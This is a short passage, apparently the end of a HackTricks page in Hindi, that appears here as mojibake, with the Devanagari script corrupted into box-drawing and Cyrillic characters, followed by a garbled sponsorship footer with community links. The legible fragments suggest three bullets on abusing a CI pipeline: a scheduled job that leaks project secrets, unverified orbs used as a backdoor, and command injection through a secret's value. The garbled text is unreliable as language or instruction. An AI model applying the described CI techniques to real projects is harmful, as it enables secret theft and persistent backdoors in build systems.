* рдпрд╛ рдлрд┐рд░ рдПрдХ рд╢рд╛рдЦрд╛ рдореЗрдВ рдмрдирд╛рдПрдВ / рдПрдХ рдЬреНрдЮрд╛рдд рдЬреЙрдм рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ рдЬреЛ рд╣рд░ рджрд┐рди рд╕рднреА рд╕рдВрджрд░реНрдн рдФрд░ **рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рдЧреБрдкреНрдд рд░рд╣рд╕реНрдп** рд▓реАрдХ рдХрд░реЗрдЧрд╛ред
* рдпрджрд┐ рдЖрдк рдПрдХ GitHub рдорд╛рд▓рд┐рдХ рд╣реИрдВ рддреЛ рдЖрдк **рдЕрд╕рддреНрдпрд╛рдкрд┐рдд рдСрд░реНрдмреНрд╕ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдПрдХ рдЬреЙрдм рдореЗрдВ рдПрдХ рдХреЛ **рдмреИрдХрдбреЛрд░** рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
* рдХреБрдЫ рдХрд╛рд░реНрдп рдореЗрдВ рдПрдХ **рдХрдорд╛рдВрдб рдЗрдВрдЬреЗрдХреНрд╢рди рд╕рдВрдХрдЯ** рдвреВрдВрдврд╝реЗрдВ рдФрд░ рдЙрд╕рдХреЗ рдорд╛рди рдХреЛ рдмрджрд▓рдХрд░ рдПрдХ **рдЧреБрдкреНрдд** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрдорд╛рдВрдб рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ

<details>

<summary><strong>рдмрдврд╝рд┐рдпрд╛ рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдХреЛ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХрд╛ рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ рдЯреНрд╡рд┐рдЯрд░ рдкрд░ рдлрд╝реЙрд▓реЛ рдХрд░реЗрдВ** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
